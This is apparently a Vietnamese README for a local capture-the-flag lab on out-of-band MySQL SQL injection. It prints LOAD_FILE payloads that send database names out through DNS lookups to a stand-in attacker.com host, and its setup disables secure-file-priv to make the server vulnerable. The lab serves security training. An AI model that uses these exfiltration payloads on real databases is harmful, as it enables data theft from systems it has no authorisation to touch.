# SQLi-035: MySQL OOB DNS Exfiltration via LOAD_FILE

## 🎯 Mục Tiêu

Khai thác Out-of-Band SQL Injection trên MySQL bằng cách sử dụng `LOAD_FILE()` với UNC path để trigger DNS lookup và exfiltrate dữ liệu.

## 📝 Mô Tả

**Scenario:** Một ứng dụng web chạy trên Windows server kết nối đến MySQL database. Ứng dụng có chức năng tìm kiếm sản phẩm nhưng không hiển thị lỗi hay kết quả trực tiếp - response luôn giống nhau.

**URL:** `http://localhost:5035/product?id=1`

**Đặc điểm:**

- Response không thay đổi dù query thành công hay thất bại
- Không có error messages
- Time-based techniques bị chặn hoặc không ổn định
- Cần sử dụng OOB channel để exfiltrate data

## 🎓 Kiến Thức Cần Thiết

### LOAD_FILE() với UNC Path

MySQL trên Windows có thể sử dụng `LOAD_FILE()` để đọc file từ UNC path, trigger SMB connection và DNS lookup:

```sql
SELECT LOAD_FILE('\\\\attacker.com\\share\\file')
```

Khi MySQL cố gắng resolve `attacker.com`, nó sẽ gửi DNS query → attacker có thể capture.

### Data Exfiltration via DNS

```sql
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\a'))
```

DNS query sẽ là: `<database_name>.attacker.com` → Exfiltrate database name!

## 🛠️ Tools Required

- **Burp Suite Pro** với Collaborator hoặc
- **interactsh** (free alternative)
- DNS resolves cho attacker domain

## 🚀 Run Lab

### Chuẩn Bị

1. **Cấu hình MySQL:**

   - Mở file `my.ini` (thường tại `C:\ProgramData\MySQL\MySQL Server 8.0\my.ini`)
   - Thêm hoặc sửa dòng sau trong section `[mysqld]`:
     ```ini
     secure-file-priv=""
     ```
   - Restart MySQL service

2. **Tạo Database:**

   ```cmd
   "C:\Program Files\MySQL\MySQL Server 8.0\bin\mysql.exe" -u root -p < D:\CTF\web-security-labs\01-Web-Security\01-SQL-Injection\Module-06-OOB-SQLi\SQLi-035\init.sql
   ```

   _(Thay đường dẫn cho phù hợp với máy bạn)_

3. **Khởi chạy Lab:**

   ```cmd
   cd D:\CTF\web-security-labs\01-Web-Security\01-SQL-Injection\Module-06-OOB-SQLi\SQLi-035\src
   python app.py
   ```

4. **Verify:**
   - Mở browser: `http://localhost:5035/product?id=1`
   - Hoặc dùng curl: `curl http://localhost:5035/product?id=1`

## 💡 Hints

1. Confirm injection point trước
2. Setup OOB listener (Burp Collaborator hoặc interactsh)
3. Thử trigger DNS lookup cơ bản trước khi exfiltrate data
4. DNS subdomain có giới hạn 63 chars/label, cần encode nếu data dài

## ⚠️ Lưu Ý

- Lab này giả lập Windows environment với MySQL
- Trong Docker, UNC path được simulate qua DNS lookup
- Real-world scenario yêu cầu Windows server thực

## 🏁 Flag Format

```
FLAG{...}
```

Flag nằm trong bảng `flags` của database.
